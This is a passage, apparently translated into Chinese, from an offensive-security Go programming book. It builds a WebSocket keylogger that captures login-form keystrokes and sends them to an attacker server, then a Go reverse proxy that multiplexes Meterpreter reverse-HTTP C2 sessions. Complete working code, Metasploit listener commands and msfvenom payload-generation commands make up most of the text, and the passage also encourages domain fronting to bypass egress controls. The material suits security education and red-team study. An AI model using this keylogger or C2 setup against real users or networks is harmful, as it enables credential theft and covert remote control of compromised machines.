为了演示，你将使用 JS Bin (*[`jsbin.com`](http://jsbin.com)*) 来测试你的有效载荷。JS Bin 是一个在线工具，开发者可以在其中测试他们的 HTML 和 JavaScript 代码。用浏览器打开 JS Bin，粘贴以下 HTML 到左侧的代码框中，完全替换默认代码：

```
<!DOCTYPE html>
<html>
<head>
  <title>Login</title>
</head>
<body>
 <script src='http://localhost:8080/k.js'></script>
  <form action='/login' method='post'>
    <input name='username'/>
    <input name='password'/>
    <input type="submit"/>   
  </form>
</body>
</html>
```

在屏幕右侧，你将看到渲染后的表单。如你所见，你已添加了一个 `script` 标签，并将 `src` 属性设置为 `http://localhost:8080/k.js`。这将是创建 WebSocket 连接并将用户输入发送到服务器的 JavaScript 代码。

你的服务器需要做两件事：处理 WebSocket 连接并提供 JavaScript 文件。首先，让我们把 JavaScript 的部分处理掉，因为毕竟本书是关于 Go 的，而不是 JavaScript。（可以查看 *[`github.com/gopherjs/gopherjs/`](https://github.com/gopherjs/gopherjs/)*，了解如何使用 Go 编写 JavaScript。）下面是 JavaScript 代码：

```
(function() {
    var conn = new WebSocket("ws://{{.}}/ws");
    document.onkeypress = keypress;
    function keypress(evt) {
        s = String.fromCharCode(evt.which);
        conn.send(s);
    }
})();
```

JavaScript 代码处理按键事件。每次按下一个键时，代码会通过 WebSocket 将按键发送到`ws://{{.}}/ws`上的资源。请回忆一下，`{{.}}`值是 Go 模板占位符，表示当前的上下文。这个资源代表一个 WebSocket URL，它会根据你传递给模板的字符串来填充服务器位置的信息。稍后我们会讲到。对于这个例子，你将把 JavaScript 保存到名为*logger.js*的文件中。

等等，你可能会说，我们之前说过我们是以*k.js*来提供服务的！我们之前展示的 HTML 也明确使用了*k.js*。怎么回事呢？其实，*logger.js*是一个 Go 模板，而不是一个实际的 JavaScript 文件。你将在路由器中使用*k.js*作为匹配模式。当匹配时，服务器将渲染存储在*logger.js*文件中的模板，并且会包含表示 WebSocket 连接的主机的上下文数据。你可以通过查看服务器代码来了解它是如何工作的，代码展示在清单 4-9 中。

```
import (
    "flag"
    "fmt"
    "html/template"
    "log"
    "net/http"

    "github.com/gorilla/mux"
 ❶ "github.com/gorilla/websocket"
)

var (
 ❷ upgrader = websocket.Upgrader{
        CheckOrigin: func(r *http.Request) bool { return true },
    }

    listenAddr string
    wsAddr     string
    jsTemplate *template.Template
)

func init() {
    flag.StringVar(&listenAddr, "listen-addr", "", "Address to listen on")
    flag.StringVar(&wsAddr, "ws-addr", "", "Address for WebSocket connection")
    flag.Parse()
    var err error
 ❸ jsTemplate, err = template.ParseFiles("logger.js")
    if err != nil {
        panic(err)
    }
}

func serveWS(w http.ResponseWriter, r *http.Request) {
 ❹ conn, err := upgrader.Upgrade(w, r, nil)
    if err != nil {
        http.Error(w, "", 500)
        return
    }
    defer conn.Close()
    fmt.Printf("Connection from %s\n", conn.RemoteAddr().String())
 for {
     ❺ _, msg, err := conn.ReadMessage()
        if err != nil {
            return
        }
     ❻ fmt.Printf("From %s: %s\n", conn.RemoteAddr().String(), string(msg))
    }
}

func serveFile(w http.ResponseWriter, r *http.Request) {
 ❼ w.Header().Set("Content-Type", "application/javascript")
 ❽ jsTemplate.Execute(w, wsAddr)
}

func main() {
    r := mux.NewRouter()
 ❾ r.HandleFunc("/ws", serveWS)
 ❿ r.HandleFunc("/k.js", serveFile)
    log.Fatal(http.ListenAndServe(":8080", r))
}
```

*清单 4-9：按键记录服务器 (*[/ch-4/websocket_keylogger/main.go](https://github.com/blackhat-go/bhg/blob/master/ch-4/websocket_keylogger/main.go)*)*

我们有很多内容需要讨论。首先，请注意你使用了另一个第三方包`gorilla/websocket`来处理你的 WebSocket 通信❶。这是一个功能齐全、强大的包，它简化了你的开发过程，就像你在本章早些时候使用的`gorilla/mux`路由器一样。别忘了先在终端中运行`go get github.com/gorilla/websocket`。

然后你定义了几个变量。你创建了一个`websocket.Upgrader`实例，它将基本上将所有来源列入白名单❷。通常，允许所有来源的做法是不安全的，但在这种情况下，由于这是我们在本地工作站上运行的测试实例，我们可以这样做。如果是在实际的恶意部署中，你可能会想将来源限制为特定值。

在`init()`函数中，它会在`main()`之前自动执行，你在其中定义了命令行参数，并尝试解析存储在*logger.js*文件中的 Go 模板。请注意，你调用了`template.ParseFiles("logger.js")`❸。你检查响应，确保文件正确解析。如果一切成功，你会将解析后的模板存储在名为`jsTemplate`的变量中。

到目前为止，你还没有为模板提供任何上下文数据或执行它。这将在稍后完成。然而，首先，你定义了一个名为`serveWS()`的函数，用于处理 WebSocket 通信。你通过调用`upgrader.Upgrade(http.ResponseWriter, *http.Request, http.Header)` ❹来创建一个新的`websocket.Conn`实例。`Upgrade()`方法将 HTTP 连接升级为 WebSocket 协议。这意味着由该函数处理的任何请求都会升级为使用 WebSocket。你在一个无限的`for`循环内与连接进行交互，调用`conn.ReadMessage()`来读取传入的消息 ❺。如果你的 JavaScript 正常工作，这些消息应该是捕获的按键记录。你将这些消息以及客户端的远程 IP 地址写入标准输出 ❻。

你已经完成了创建 WebSocket 处理函数中可能最困难的部分。接下来，你创建了另一个名为`serveFile()`的处理函数。此函数将检索并返回你的 JavaScript 模板的内容，同时包括上下文数据。为此，你将`Content-Type`头设置为`application/javascript` ❼。这将告诉连接的浏览器，HTTP 响应体的内容应当被当作 JavaScript 来处理。在处理函数的第二行也是最后一行中，你调用`jsTemplate.Execute(w, wsAddr)` ❽。还记得你在`init()`函数中引导服务器时是如何解析*logger.js*的吗？你将结果存储在名为`jsTemplate`的变量中。这行代码处理该模板。你将一个`io.Writer`传递给它（在这个例子中，你使用的是`w`，一个`http.ResponseWriter`），以及你的上下文数据类型`interface{}`。`interface{}`类型意味着你可以传递任何类型的变量，无论是字符串、结构体还是其他类型。在这个例子中，你传递了一个名为`wsAddr`的字符串变量。如果你回到`init()`函数，你会看到这个变量包含了你的 WebSocket 服务器的地址，并通过命令行参数设置。简而言之，它用数据填充模板，并将其作为 HTTP 响应写出。相当巧妙！

你已经实现了处理函数`serveFile()`和`serveWS()`。现在，你只需要配置路由器以执行模式匹配，这样就可以将执行传递给适当的处理函数。你像以前一样，在`main()`函数中执行这一步。你的两个处理函数中的第一个匹配`/ws` URL 模式，执行`serveWS()`函数以升级并处理 WebSocket 连接 ❾。第二个路由匹配`/k.js`模式，执行`serveFile()`函数 ❿。这就是你的服务器如何将渲染后的 JavaScript 模板推送到客户端的方式。

启动服务器。如果你打开 HTML 文件，你应该看到一条消息显示`connection established`。这是因为你的 JavaScript 文件已经在浏览器中渲染并请求了 WebSocket 连接。如果你在表单元素中输入凭据，你应该会看到它们被打印到服务器的 stdout 上：

```
$ go run main.go -listen-addr=127.0.0.1:8080 -ws-addr=127.0.0.1:8080
Connection from 127.0.0.1:58438
From 127.0.0.1:58438: u
From 127.0.0.1:58438: s
From 127.0.0.1:58438: e
From 127.0.0.1:58438: r
From 127.0.0.1:58438:
From 127.0.0.1:58438: p
From 127.0.0.1:58438: @
From 127.0.0.1:58438: s
From 127.0.0.1:58438: s
From 127.0.0.1:58438: w
From 127.0.0.1:58438: o
From 127.0.0.1:58438: r
From 127.0.0.1:58438: d
```

你做到了！它工作了！你的输出列出了填写登录表单时按下的每一个单独的按键。在这种情况下，它是一组用户凭据。如果你遇到问题，请确保你提供了准确的地址作为命令行参数。此外，如果你尝试从 `localhost:8080` 以外的服务器调用 *k.js*，可能需要调整 HTML 文件本身。

你可以通过几种方式改进这段代码。例如，你可能希望将输出日志记录到文件或其他持久存储中，而不是记录到终端中。这样，如果终端窗口关闭或服务器重启，你就不太可能丢失数据。另外，如果你的键盘记录器同时记录多个客户端的按键，输出会混合数据，这可能使得分辨特定用户的凭据信息变得困难。你可以通过找到更好的展示格式来避免这种情况，例如，将按键按唯一客户端/端口来源分组。

你的凭据收集之旅已经结束。我们将通过介绍 HTTP 命令与控制连接的多路复用来结束这一章。

### 命令与控制的多路复用

你已经到达了本章关于 HTTP 服务器的最后一节。在这里，你将了解如何将 Meterpreter HTTP 连接多路复用到不同的后台控制服务器。*Meterpreter* 是一个流行的、灵活的命令与控制（C2）套件，属于 Metasploit 漏洞利用框架的一部分。我们不会深入讨论 Metasploit 或 Meterpreter。如果你是新手，我们建议你阅读一些教程或文档网站。

在这一节中，我们将演示如何用 Go 创建一个反向 HTTP 代理，这样你就可以根据 `Host` HTTP 头动态路由你的 Meterpreter 会话，这与虚拟主机的工作方式相同。然而，不同的是，你将代理连接到不同的 Meterpreter 监听器，而不是提供不同的本地文件和目录。这是一个有趣的用例，原因有很多。

首先，你的代理充当重定向器，允许你仅公开该域名和 IP 地址，而不暴露你的 Metasploit 监听器。如果重定向器被列入黑名单，你可以简单地将它移走，而无需移动 C2 服务器。其次，你可以扩展这里的概念来执行 *域名伪装*，这是一种利用受信任的第三方域名（通常来自云服务提供商）绕过限制性出站控制的技术。我们在这里不会深入展示完整的例子，但我们强烈推荐你深入了解它，因为它非常强大，可以帮助你突破受限的网络。最后，使用案例展示了你如何与一组可能针对不同目标组织的盟友共享一个主机/端口组合。由于端口 80 和 443 是最可能被允许的出站端口，你可以使用你的代理监听这些端口，并智能地将连接路由到正确的监听器。

计划是这样的。你将设置两个独立的 Meterpreter 反向 HTTP 监听器。在这个例子中，它们将驻留在一个 IP 地址为 10.0.1.20 的虚拟机上，但它们也可以存在于不同的主机上。你将分别将监听器绑定到端口 10080 和 20080。在实际情况中，这些监听器可以运行在任何地方，只要代理能够访问这些端口。确保你已经安装了 Metasploit（它在 Kali Linux 中预装），然后启动你的监听器。

```
   $ msfconsole
   > use exploit/multi/handler
   > set payload windows/meterpreter_reverse_http
❶ > set LHOST 10.0.1.20
   > set LPORT 80
❷ > set ReverseListenerBindAddress 10.0.1.20
   > set ReverseListenerBindPort 10080
   > exploit -j -z
   [*] Exploit running as background job 1.

   [*] Started HTTP reverse handler on http://10.0.1.20:10080
```

启动监听器时，你将代理数据作为 `LHOST` 和 `LPORT` 值 ❶ 提供。然而，你将高级选项 `ReverseListenerBindAddress` 和 `ReverseListenerBindPort` 设置为你希望监听器启动的实际 IP 和端口 ❷。这样，你可以在使用端口时具有一些灵活性，同时显式地识别代理主机——如果你设置了域名伪装，这个主机名可能就是一个域名。

在第二个 Metasploit 实例中，你将做类似的操作，启动一个在端口 20080 上的额外监听器。唯一的实际区别是你将绑定到不同的端口：

```
$ msfconsole
> use exploit/multi/handler
> set payload windows/meterpreter_reverse_http
> set LHOST 10.0.1.20
> set LPORT 80
> set ReverseListenerBindAddress 10.0.1.20
> set ReverseListenerBindPort 20080
> exploit -j -z
[*] Exploit running as background job 1.

[*] Started HTTP reverse handler on http://10.0.1.20:20080
```

现在，让我们创建你的反向代理。清单 4-10 显示了完整的代码。

```
   package main

   import (
       "log"
       "net/http"
    ❶ "net/http/httputil"
       "net/url"
 "github.com/gorilla/mux"
   )

❷ var (
       hostProxy = make(map[string]string)
       proxies   = make(map[string]*httputil.ReverseProxy)
   )

   func init() {
    ❸ hostProxy["attacker1.com"] = "http://10.0.1.20:10080"
       hostProxy["attacker2.com"] = "http://10.0.1.20:20080"

       for k, v := range hostProxy {
        ❹ remote, err := url.Parse(v)
           if err != nil {
               log.Fatal("Unable to parse proxy target")
           }  
        ❺ proxies[k] = httputil.NewSingleHostReverseProxy(remote)
       }  
   }

   func main() {
       r := mux.NewRouter()
       for host, proxy := range proxies {
        ❻ r.Host(host).Handler(proxy)
       }  
       log.Fatal(http.ListenAndServe(":80", r))
   }
```

*清单 4-10：复用 Meterpreter (*[/ch-4/multiplexer/main.go](https://github.com/blackhat-go/bhg/blob/master/ch-4/multiplexer/main.go)*)*

首先，你会注意到你正在导入 `net/http/httputil` 包 ❶，该包包含辅助创建反向代理的功能。它将免去你从头开始创建一个的麻烦。

在导入包之后，定义一对变量 ❷。两个变量都是映射（map）。你将使用第一个变量 `hostProxy`，它将主机名映射到你希望该主机名路由到的 Metasploit 监听器的 URL。记住，你将基于代理接收到的 HTTP 请求中的 `Host` 头来进行路由。保持这个映射是确定目标的简单方法。

你定义的第二个变量`proxies`也将使用主机名作为键值。然而，它们在映射中的对应值是`*httputil.ReverseProxy`实例。也就是说，这些值将是实际的代理实例，你可以将流量路由到它们，而不是目标的字符串表示。

请注意，你正在硬编码这些信息，这并不是管理配置和代理数据的最优雅方式。更好的实现方法是将这些信息存储在外部配置文件中。我们把这个作为练习留给你。

你使用`init()`函数来定义域名和目标 Metasploit 实例之间的映射❸。在这种情况下，你将任何`Host`头值为`attacker1.com`的请求路由到`http://10.0.1.20:10080`，将任何`Host`头值为`attacker2.com`的请求路由到`http://10.0.1.20:20080`。当然，你现在还没有真正进行路由；你只是在创建一个初步的配置。请注意，这些目标与之前为 Meterpreter 监听器使用的`ReverseListenerBindAddress`和`ReverseListenerBindPort`值相对应。

接下来，仍然在你的`init()`函数中，你遍历`hostProxy`映射，解析目标地址来创建`net.URL`实例❹。你将结果作为输入传递给`httputil.NewSingleHostReverseProxy(net.URL)`❺，这是一个从 URL 创建反向代理的辅助函数。更棒的是，`httputil.ReverseProxy`类型实现了`http.Handler`接口，这意味着你可以将创建的代理实例作为路由器的处理器。在你的`main()`函数中，你这样做：创建一个路由器，然后遍历所有的代理实例。记住，键是主机名，值是`httputil.ReverseProxy`类型。对于映射中的每个键值对，你将把一个匹配函数添加到路由器中❻。Gorilla MUX 工具包中的`Route`类型包含一个名为`Host`的匹配函数，它接受一个主机名来匹配传入请求中的`Host`头值。对于你要检查的每个主机名，你会告诉路由器使用相应的代理。这是一个出乎意料的简单解决方案，能够应对本来可能是复杂的问题。

你的程序通过启动服务器并将其绑定到端口 80 来结束。保存并运行程序。你需要以特权用户身份运行，因为你正在绑定到特权端口。

到目前为止，你已经运行了两个 Meterpreter 反向 HTTP 监听器，并且现在应该也已经启动了反向代理。最后一步是生成测试有效载荷，检查你的代理是否正常工作。我们使用`msfvenom`，一个随 Metasploit 一起提供的有效载荷生成工具，来生成一对 Windows 可执行文件：

```
$ msfvenom -p windows/meterpreter_reverse_http LHOST=10.0.1.20 LPORT=80
HttpHostHeader=attacker1.com -f exe -o payload1.exe
$ msfvenom -p windows/meterpreter_reverse_http LHOST=10.0.1.20 LPORT=80
HttpHostHeader=attacker2.com -f exe -o payload2.exe
```

这会生成两个输出文件，分别命名为 *payload1.exe* 和 *payload2.exe*。请注意，除了输出文件名外，它们之间唯一的区别是 `HttpHostHeader` 值。这确保了生成的有效载荷发送 HTTP 请求时，带有特定的 `Host` 头部值。另请注意，`LHOST` 和 `LPORT` 值对应的是你的反向代理信息，而不是你的 Meterpreter 监听器。将生成的可执行文件传输到 Windows 系统或虚拟机中。当你执行这些文件时，你应该看到两个新的会话被建立：一个绑定到 10080 端口的监听器，另一个绑定到 20080 端口的监听器。它们应该类似于下面的样子：

```
>
[*] http://10.0.1.20:10080 handling request from 10.0.1.20; (UUID: hff7podk) Redirecting stageless
connection from /pxS_2gL43lv34_birNgRHgL4AJ3A9w3i9FXG3Ne2-3UdLhACr8-Qt6QOlOw
PTkzww3NEptWTOan2rLo5RT42eOdhYykyPYQy8dq3Bq3Mi2TaAEB with UA 'Mozilla/5.0 (Windows NT 6.1;
Trident/7.0;
rv:11.0) like Gecko'
[*] http://10.0.1.20:10080 handling request from 10.0.1.20; (UUID: hff7podk) Attaching
orphaned/stageless session...
[*] Meterpreter session 1 opened (10.0.1.20:10080 -> 10.0.1.20:60226) at 2020-07-03 16:13:34 -0500
```

如果你使用 tcpdump 或 Wireshark 来检查目标为 10080 或 20080 端口的网络流量，你应该会看到你的反向代理是唯一与 Metasploit 监听器通信的主机。你还可以确认 `Host` 头部被正确地设置为 `attacker1.com`（对于 10080 端口的监听器）和 `attacker2.com`（对于 20080 端口的监听器）。

就这样，你完成了！现在，可以更进一步了。作为一个练习，我们建议你更新代码，使用分阶段的有效载荷。这可能带来额外的挑战，因为你需要确保两个阶段都能通过代理正确地路由。此外，尝试使用 HTTPS 而不是明文 HTTP 来实现。这将进一步加深你对代理流量的理解，并提高你在实际、恶意的场景中利用代理的能力。

### 总结

你已经完成了 HTTP 的学习旅程，在过去的两章中，你已经处理了客户端和服务器的实现。在下一章中，你将重点学习 DNS，这是一个同样对安全从业者非常有用的协议。事实上，你将接近通过 DNS 来复制这个 HTTP 多路复用的例子。
